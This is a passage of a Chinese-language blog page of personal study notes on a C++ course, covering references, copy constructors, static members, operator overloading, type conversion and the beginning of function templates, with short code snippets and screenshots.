</blockquote>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220821144538785.png" alt="image-20220821144538785"></p>
<h2 id="不能返回类-最好返回指针"><a href="#不能返回类-最好返回指针" class="headerlink" title="不能返回类 最好返回指针"></a>不能返回类 最好返回指针</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220821145713787.png" alt="image-20220821145713787"></p>
<h2 id="Overriding"><a href="#Overriding" class="headerlink" title="Overriding"></a>Overriding</h2><h2 id="覆盖-改写-virtual函数即是覆盖-改写"><a href="#覆盖-改写-virtual函数即是覆盖-改写" class="headerlink" title="覆盖/改写 (virtual函数即是覆盖/改写)"></a>覆盖/改写 (virtual函数即是覆盖/改写)</h2><h2 id="子类调用父类函数实例"><a href="#子类调用父类函数实例" class="headerlink" title="子类调用父类函数实例"></a>子类调用父类函数实例</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220821145143920.png" alt="image-20220821145143920"></p>
<h2 id="既有overloading-又有-override-即使是虚构函数也会发生-name-hidding"><a href="#既有overloading-又有-override-即使是虚构函数也会发生-name-hidding" class="headerlink" title="既有overloading 又有 override 即使是虚构函数也会发生 name hidding"></a>既有overloading 又有 override 即使是虚构函数也会发生 name hidding</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220821145435715.png" alt="image-20220821145435715"></p>
<h1 id="第二十一章-引用再讲究"><a href="#第二十一章-引用再讲究" class="headerlink" title="第二十一章 引用再讲究"></a>第二十一章 引用再讲究</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span>: </span><br><span class="line">    	<span class="keyword">int</span>&amp; m_u;</span><br><span class="line">    	<span class="built_in">X</span>(<span class="keyword">int</span>&amp; a);</span><br><span class="line">&#125;;</span><br><span class="line">X::<span class="built_in">X</span>(<span class="keyword">int</span>&amp; a) : <span class="built_in">m_y</span>(a) &#123; &#125; <span class="comment">// 引用必须要放在 initialize list 里头 否则会报错 </span></span><br></pre></td></tr></table></figure>
<p>返回的就是引用，而把引用（返回值）作为右边的值就是把引用的值赋值给左边<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">main</span>() &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> ; i&lt; SIZE ; i++) &#123;</span><br><span class="line">        myarray[i]= i * <span class="number">0.5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">double</span> value = <span class="built_in">subscrip</span>(<span class="number">12</span>);</span><br><span class="line">    <span class="built_in">subscrip</span>(<span class="number">3</span>) = <span class="number">34.5</span>;<span class="comment">// subsrcip(3) 是reference 所以 返回对象的变量会变成34.5</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220821235129732.png" alt="image-20220821235129732"></p>
<p>const 是函数对 调用者的保证</p>
<blockquote>
<p>Const reference parameters</p>
<p>What if you don’t want the argument changed?</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// y is a constant! Can&#x27;t be modified \</span></span><br><span class="line"><span class="comment">void funce(const int &amp; y , int &amp; z) &#123;</span></span><br><span class="line">	z = z *<span class="number">5</span>; <span class="comment">// ok</span></span><br><span class="line">	y+=<span class="number">8</span>; <span class="comment">// error!</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> &amp; i)</span></span>;</span><br><span class="line"><span class="built_in">func</span> (i*<span class="number">3</span>);<span class="comment">// Generates warining or error!</span></span><br><span class="line"><span class="comment">//因为引用是传 一个指针参数, 而不是单纯赋值, i*3 在内存中是存在于一个const的变量. 而int&amp;i因此无法接受这个变量</span></span><br></pre></td></tr></table></figure>
<h2 id="返回值-返回变量-对象"><a href="#返回值-返回变量-对象" class="headerlink" title="返回值, 返回变量/对象"></a>返回值, 返回变量/对象</h2><p>返回变量/对象 都可以做左值. 如果是返回值就不能做左值</p>
<h1 id="第二十二章-I-拷贝构造"><a href="#第二十二章-I-拷贝构造" class="headerlink" title="第二十二章 I 拷贝构造"></a>第二十二章 I 拷贝构造</h1><ul>
<li>Create a new  object from an exsiting one <ul>
<li>For example, when calling a function</li>
</ul>
</li>
</ul>
<h2 id="赋值和初始化-声明和定义"><a href="#赋值和初始化-声明和定义" class="headerlink" title="赋值和初始化   声明和定义"></a>赋值和初始化   声明和定义</h2><p>内存有不同</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">HowMany h2 = h; <span class="comment">// h2不会调用构造函数</span></span><br><span class="line"><span class="function">HowMany <span class="title">h2</span><span class="params">(<span class="number">10</span>)</span> </span>= h; <span class="comment">// h2会调用带参数的构造函数</span></span><br></pre></td></tr></table></figure>
<h2 id="拷贝构造-用等号初始化时-构造函数的参数要和等号传进来的参数有关联而初始化-叫做拷贝构造"><a href="#拷贝构造-用等号初始化时-构造函数的参数要和等号传进来的参数有关联而初始化-叫做拷贝构造" class="headerlink" title="拷贝构造: 用等号初始化时, 构造函数的参数要和等号传进来的参数有关联而初始化 叫做拷贝构造"></a>拷贝构造: 用等号初始化时, 构造函数的参数要和等号传进来的参数有关联而初始化 叫做拷贝构造</h2><p><code>T::T(const T&amp;)</code></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220822140006203.png" alt="image-20220822140006203"></p>
<p>不是字节对字节的拷贝. </p>
<p><strong>是成员对成员的拷贝</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">HowMany</span>( HowMany o) &#123; objectCount++;<span class="built_in">print</span>(<span class="string">&quot;HowMany(HM)&quot;</span>); &#125;</span><br><span class="line"><span class="comment">// 拷贝构造会再调用 HowMany o 里面的拷贝构造, 从而形成递归. 甚至递归没有出口</span></span><br><span class="line"><span class="built_in">HowMany</span>(<span class="keyword">const</span> HowMany &amp;o) &#123; objectCount++;<span class="built_in">print</span>(<span class="string">&quot;HowMany(HM)&quot;</span>); &#125;</span><br><span class="line"><span class="comment">//因此需要写成 `const HowMany &amp; o`  使得引用不会调用拷贝构造, 也只有这样才能进行拷贝构造</span></span><br></pre></td></tr></table></figure>
<h1 id="第二十二章-II-拷贝构造"><a href="#第二十二章-II-拷贝构造" class="headerlink" title="第二十二章 II 拷贝构造"></a>第二十二章 II 拷贝构造</h1><h2 id="自己不写一个拷贝构造-使用新的自动的拷贝构造时-新老指针指向同一块内存"><a href="#自己不写一个拷贝构造-使用新的自动的拷贝构造时-新老指针指向同一块内存" class="headerlink" title="自己不写一个拷贝构造, 使用新的自动的拷贝构造时, 新老指针指向同一块内存"></a>自己不写一个拷贝构造, 使用新的自动的拷贝构造时, 新老指针指向同一块内存</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220824014905286.png" alt="image-20220824014905286"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220824015523857.png" alt="image-20220824015523857"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Person.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220824020143603.png" alt="image-20220824020143603"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Person::<span class="built_in">Person</span> ( <span class="keyword">const</span> Person &amp; w)&#123;</span><br><span class="line">    name = <span class="keyword">new</span> <span class="keyword">char</span>[::<span class="built_in">strlen</span>(w.name) + <span class="number">1</span>];</span><br><span class="line">    ::<span class="built_in">strcpy</span>(name, w.name); <span class="comment">// 创建一个拷贝构造</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ::strcpy 指的是 std::strcpy(引用外部函数)</span></span><br></pre></td></tr></table></figure>
<p>声明拷贝构造 <code>w.name</code> 拿一个对象出来制造一个新的构造</p>
<h2 id="拷贝构造何时会被调用"><a href="#拷贝构造何时会被调用" class="headerlink" title="拷贝构造何时会被调用?"></a>拷贝构造何时会被调用?</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220824020723516.png" alt="image-20220824020723516"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Person baby_b = baby_a;</span><br><span class="line"><span class="function">person <span class="title">baby_c</span> <span class="params">(baby_a)</span></span>;</span><br><span class="line"><span class="comment">// 这两者是相等的	</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220824021345312.png" alt="image-20220824021345312"></p>
<p>编译器自动检查 Person ( who ) 不需要构造;</p>
<h2 id="Constructor-vs-assignment-赋值"><a href="#Constructor-vs-assignment-赋值" class="headerlink" title="Constructor vs. assignment(赋值)."></a>Constructor vs. assignment(赋值).</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220824021615402.png" alt="image-20220824021615402"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220824021746652.png" alt="image-20220824021746652"></p>
<h2 id="拷贝构造指示"><a href="#拷贝构造指示" class="headerlink" title="拷贝构造指示"></a>拷贝构造指示</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220824022019565.png" alt="image-20220824022019565"></p>
<blockquote>
<p> 写一个类</p>
<ol>
<li>构造函数 (constructor)</li>
<li>virtual constructor (虚构函数)</li>
<li>拷贝构造函数  (copy constructor)</li>
<li>不要依赖于编译器给你的那个默认构造</li>
</ol>
</blockquote>
<h1 id="第二十三章-静态对象"><a href="#第二十三章-静态对象" class="headerlink" title="第二十三章 静态对象"></a>第二十三章 静态对象</h1><h2 id="Static-in-C"><a href="#Static-in-C" class="headerlink" title="Static in C++"></a>Static in C++</h2><ul>
<li>Static storage<ul>
<li>allocated once at a fixed address</li>
</ul>
</li>
<li>Visibility of a name <ul>
<li>internal linkage</li>
</ul>
</li>
<li>Don’t use static except inside functions and classes.</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220825140658443.png" alt="image-20220825140658443"></p>
<h3 id="静态对象保证"><a href="#静态对象保证" class="headerlink" title="静态对象保证"></a>静态对象保证</h3><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220825141531142.png" alt="image-20220825141531142"></p>
<ol>
<li>只初始化一次(构造只执行一次)</li>
<li>析构在退出程序之前执行</li>
</ol>
<h2 id="条件构造"><a href="#条件构造" class="headerlink" title="条件构造"></a>条件构造</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220825141753759.png" alt="image-20220825141753759"></p>
<blockquote>
<p>my_x  1.只析构一次, 当分 x &gt; 10时, f()被调用 2. 第二次进入函数仍然保持它的值. 3. 只有构造过才会析构</p>
</blockquote>
<h2 id="全局变量-对象"><a href="#全局变量-对象" class="headerlink" title="全局变量(对象)"></a>全局变量(对象)</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220825142100345.png" alt="image-20220825142100345"></p>
<p> main()不再是进入函数后执行的第一条函数</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220825142454203.png" alt="image-20220825142454203"></p>
<p>跨文件的全局变量初始化的顺序没有人规定</p>
<h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><p>但某个变量的值需要另一个变量初始化过, 因为 跨文件的全局变量初始化顺序是随机的, 所以容易出错.</p>
<p>解决办法:</p>
<ol>
<li>全局变量声明在同一个文件中(有依赖的全局变量);</li>
<li>不使用全局变量</li>
</ol>
<blockquote>
<p><code>static修饰全局变量，使得全局变量作用域只限于当前文件，不可被跨文件使用。</code></p>
</blockquote>
<h1 id="第二十四章-静态成员"><a href="#第二十四章-静态成员" class="headerlink" title="第二十四章 静态成员"></a>第二十四章 静态成员</h1><h2 id="我们怎么分配静态内存空间"><a href="#我们怎么分配静态内存空间" class="headerlink" title="我们怎么分配静态内存空间?"></a>我们怎么分配静态内存空间?</h2><ul>
<li><p>Static means</p>
<ul>
<li>Hidden</li>
<li>Persistent</li>
</ul>
</li>
<li><p>Hidden: A static member is a member</p>
<ul>
<li>Obeys usual access rules</li>
</ul>
</li>
<li>Persistent: Independent of instances</li>
<li>Static members are class-wide<ul>
<li>variables or</li>
<li>functions</li>
</ul>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> namespacee std;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    	<span class="built_in">A</span>() &#123; i = <span class="number">0</span>; &#125;</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;cout &lt;&lt; i &lt;&lt; endl; &#125;</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> ii)</span> </span>&#123; i=ii; &#125;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    	<span class="keyword">static</span> <span class="keyword">int</span> i;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> A::i; <span class="comment">// 静态的成员变量实际上是全局变量,类的静态成员变量需要声明.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span>&#123;</span><br><span class="line">    A a,b;</span><br><span class="line">    a.<span class="built_in">set</span>(<span class="number">10</span>);</span><br><span class="line">    b.<span class="built_in">print</span>();</span><br><span class="line">    cout &lt;&lt;a.i &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; A::i &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="静态的成员变量实际是全局变量"><a href="#静态的成员变量实际是全局变量" class="headerlink" title="静态的成员变量实际是全局变量"></a>静态的成员变量实际是全局变量</h2><blockquote>
<p>初始化列表是会对非静态成员做初始化 对静态成员变量不做初始化.</p>
</blockquote>
<h2 id="静态的成员函数"><a href="#静态的成员函数" class="headerlink" title="静态的成员函数"></a>静态的成员函数</h2><p>在静态函数/成员变量调用之前依然能够访问这个函数/变量</p>
<p>但静态的函数只能调用静态的成员变量    </p>
<p><code>A::i</code> 类中没有this, 于是不能访问非静态的函数/成员变量    </p>
<h1 id="第二十五章-运算符-基本规则"><a href="#第二十五章-运算符-基本规则" class="headerlink" title="第二十五章 运算符 - 基本规则"></a>第二十五章 运算符 - 基本规则</h1><h2 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h2><blockquote>
<p>写函数改变运算符的行为: 运算符(如下) </p>
</blockquote>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220828065321925.png" alt="image-20220828065321925"></p>
<h2 id="不能重载的运算符"><a href="#不能重载的运算符" class="headerlink" title="不能重载的运算符"></a>不能重载的运算符</h2><blockquote>
<p>. .* :: ?: </p>
<p>sizeof  typeid </p>
<p>static_cast dynamic_cast const_cast</p>
<p>reinterpret_cast</p>
<ol>
<li>只有已经存在使得运算符可以重载 (如: ** 不能重载)</li>
<li>只能在类或者枚举类型定义一个运算符</li>
<li>运算符重载<ul>
<li>不能改变他的优先级</li>
<li>不能改变他的操作对象</li>
</ul>
</li>
</ol>
</blockquote>
<h2 id="运算符左边的对象做-receiver-来决定我们用哪个运算符"><a href="#运算符左边的对象做-receiver-来决定我们用哪个运算符" class="headerlink" title="运算符左边的对象做 receiver 来决定我们用哪个运算符"></a>运算符左边的对象做 receiver 来决定我们用哪个运算符</h2><p>​    如:</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220828072648135.png" alt="image-20220828072648135"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">Inter <span class="title">x</span><span class="params">(<span class="number">1</span>)</span>, <span class="title">y</span><span class="params">(<span class="number">5</span>)</span>, z</span>;</span><br><span class="line">x + y;  ====&gt;x.<span class="keyword">operator</span> + (y);</span><br><span class="line">z = x + y; √ <span class="comment">// x 和 y 的对象相同 可以做运算</span></span><br><span class="line">z = x + <span class="number">3</span>; √  <span class="comment">//默认Inter的 &#x27;+&#x27;</span></span><br><span class="line">z = <span class="number">3</span> + y; × <span class="comment">//默认整数的 &#x27;+&#x27; , 需要 y 类型转换成 整数</span></span><br><span class="line">z = x + <span class="number">3.5</span> × <span class="comment">//3.5是double</span></span><br></pre></td></tr></table></figure>
<h2 id="一元的运算符可以不调用参数"><a href="#一元的运算符可以不调用参数" class="headerlink" title="一元的运算符可以不调用参数."></a>一元的运算符可以不调用参数.</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220828072539476.png" alt="image-20220828072539476"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">z= -x;</span><br><span class="line">z.opertator = (x.opertator- ()));</span><br></pre></td></tr></table></figure>
<h2 id="如果运算符重载不作为成员函数-作为全局函数的时候"><a href="#如果运算符重载不作为成员函数-作为全局函数的时候" class="headerlink" title="如果运算符重载不作为成员函数, 作为全局函数的时候"></a>如果运算符重载不作为成员函数, 作为全局函数的时候</h2><p>作为全局函数的时候</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220828073546019.png" alt="image-20220828073546019"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">z = x + y;</span><br><span class="line">z = x + <span class="number">3</span>;</span><br><span class="line">z = <span class="number">3</span> + y;</span><br><span class="line">z = <span class="number">3</span> + <span class="number">7</span>;</span><br><span class="line"><span class="comment">//以上都可以被Integer类</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220828073633061.png" alt="image-20220828073633061"></p>
<ul>
<li><p>单目运算符应该是成员函数</p>
</li>
<li><p>= () [] -&gt; -&gt;* 必须是成员函数</p>
</li>
<li><p>赋值运算符应该是成员函数</p>
</li>
<li><p>所有其他的双目运算符可以做非成员函数</p>
</li>
</ul>
<blockquote>
<p>单目: 如 ~ ! ++ —等 (只对自己运算)</p>
<p>双目: + - * / == 等 (对两个数运算)</p>
<p>三目: (条件)?(行为):(行为)</p>
</blockquote>
<h1 id="第二十六章-运算符重载-原型"><a href="#第二十六章-运算符重载-原型" class="headerlink" title="第二十六章 运算符重载 - 原型"></a>第二十六章 运算符重载 - 原型</h1><h2 id="Argument-Passing-参数传递"><a href="#Argument-Passing-参数传递" class="headerlink" title="Argument Passing (参数传递)"></a>Argument Passing (参数传递)</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220828210946892.png" alt="image-20220828210946892"></p>
<h2 id="Return-Values"><a href="#Return-Values" class="headerlink" title="Return Values"></a>Return Values</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220828211649931.png" alt="image-20220828211649931"></p>
<p>赋值做左值 -&gt; 应该返回 reference </p>
<p>加减乘除不修改本身的值</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220829235220107.png" alt="image-20220829235220107"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220828211941493.png" alt=" "></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">prefix++  <span class="comment">// ++a</span></span><br><span class="line">postfix++ <span class="comment">// --a</span></span><br></pre></td></tr></table></figure>
<h2 id="Relatonal-operators"><a href="#Relatonal-operators" class="headerlink" title="Relatonal operators"></a>Relatonal operators</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220829235704816.png" alt="image-20220829235704816"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220829235714730.png" alt="image-20220829235714730"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220830000239109.png" alt="image-20220830000239109"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220830000249062.png" alt="image-20220830000249062"></p>
<h2 id="Operator"><a href="#Operator" class="headerlink" title="Operator []"></a>Operator []</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220830000021453.png" alt="image-20220830000021453"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> &amp; <span class="keyword">operator</span>[](<span class="keyword">int</span> index) &#123; <span class="keyword">return</span> m_array[index]; &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220830000113220.png" alt="image-20220830000113220"></p>
<h1 id="第二十七章-运算符重载-赋值"><a href="#第二十七章-运算符重载-赋值" class="headerlink" title="第二十七章 运算符重载-赋值"></a>第二十七章 运算符重载-赋值</h1><h2 id="赋值原型"><a href="#赋值原型" class="headerlink" title="赋值原型"></a>赋值原型<img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220830000840248.png" alt="image-20220830000840248"></h2><h1 id="第二十八章-运算符重载-类型转换"><a href="#第二十八章-运算符重载-类型转换" class="headerlink" title="第二十八章 运算符重载 - 类型转换"></a>第二十八章 运算符重载 - 类型转换</h1><h2 id="Value-classes"><a href="#Value-classes" class="headerlink" title="Value classes"></a>Value classes</h2><p> <img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901101528615.png" alt="image-20220901101528615"></p>
<p>C++ 所有的类都是小写开头</p>
<h2 id="Type-conversions"><a href="#Type-conversions" class="headerlink" title="Type conversions"></a>Type conversions</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901101648901.png" alt="image-20220901101648901"></p>
<h2 id="Wants-a-Two-has-a-One"><a href="#Wants-a-Two-has-a-One" class="headerlink" title="Wants a Two, has a One;"></a>Wants a Two, has a One;</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901103316546.png" alt="image-20220901103316546"></p>
<p>搞清楚 Two 和 one 变量到底指什么</p>
<h2 id="explicit-显示的"><a href="#explicit-显示的" class="headerlink" title="explicit (显示的)"></a>explicit (显示的)</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901103546207.png" alt="image-20220901103546207"></p>
<p>传one参数进去不太会做自动类型转换</p>
<h2 id="类型转换语句"><a href="#类型转换语句" class="headerlink" title="类型转换语句"></a>类型转换语句</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">X::<span class="keyword">operator</span> T&#123;</span><br><span class="line">    <span class="comment">// 实现转换的语句</span></span><br><span class="line">&#125; <span class="comment">//无返回值类型，无参数，返回目标类型的对象</span></span><br><span class="line"><span class="comment">//比如:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Complex</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="built_in">Complex</span>( ):<span class="built_in">real</span>(<span class="number">0</span>),<span class="built_in">imag</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line">   <span class="built_in">Complex</span>(<span class="keyword">double</span> r,<span class="keyword">double</span> i):<span class="built_in">real</span>(r),<span class="built_in">imag</span>(i)&#123;&#125;</span><br><span class="line">   <span class="function"><span class="keyword">operator</span> <span class="keyword">double</span> <span class="title">const</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  real; <span class="comment">//类型转换语句</span></span><br><span class="line">   &#125; <span class="comment">//类型转换函数     </span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">   <span class="keyword">double</span> real;</span><br><span class="line">   <span class="keyword">double</span> imag;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="function">Complex <span class="title">c1</span><span class="params">(<span class="number">3</span>,<span class="number">4</span>)</span>,<span class="title">c2</span><span class="params">(<span class="number">5</span>,<span class="number">-10</span>)</span>,c3</span>;</span><br><span class="line">   <span class="keyword">double</span> d;</span><br><span class="line">   d=<span class="number">2.5</span>+c1;<span class="comment">//要求将一个double数据与Complex类数据相加</span></span><br><span class="line">   cout&lt;&lt;d&lt;&lt;endl;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Inputs: 5.5</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Operator name is any tpye descripritor</li>
<li>No explicit arguments</li>
<li>No return type</li>
<li>Compiler will use it as a type conversion from X —&gt; T  (吧X 类对象转化为T 类对象)</li>
</ul>
<h2 id="从窄的变成宽的会自动类型转换"><a href="#从窄的变成宽的会自动类型转换" class="headerlink" title="从窄的变成宽的会自动类型转换"></a>从窄的变成宽的会自动类型转换</h2><p>​    <img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901104553743.png" alt="image-20220901104553743"></p>
<blockquote>
<p>T -&gt; T&amp; (初始化或者赋值)</p>
<p>T&amp; -&gt; T (把T&amp;中的值交给T)</p>
</blockquote>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901105850764.png" alt="image-20220901105850764"></p>
<p>加一个禁止类型转换关键字 <code>explicit</code></p>
<p>最好写功能函数 实现类型转换</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901110027289.png" alt="image-20220901110027289"></p>
<h1 id="第二十九章-模板I"><a href="#第二十九章-模板I" class="headerlink" title="第二十九章 模板I"></a>第二十九章 模板I</h1><h2 id="Why-templates"><a href="#Why-templates" class="headerlink" title="Why templates?"></a>Why templates?</h2><p>类型参数</p>
<p>函数模板</p>
<p>类模板</p>
<p>Template functions</p>
<p>Template classes</p>
<h2 id="函数模板使用"><a href="#函数模板使用" class="headerlink" title="函数模板使用"></a>函数模板使用</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap_1</span><span class="params">(<span class="keyword">int</span> &amp;x, <span class="keyword">int</span> &amp; y)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> temp = x;</span><br><span class="line">	x = y;</span><br><span class="line">	y = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt; <span class="class"><span class="keyword">class</span> <span class="title">T</span> &gt;</span> 	 <span class="comment">// template &lt; typename T &gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap_1</span> <span class="params">( T&amp;x, T&amp; y)</span> 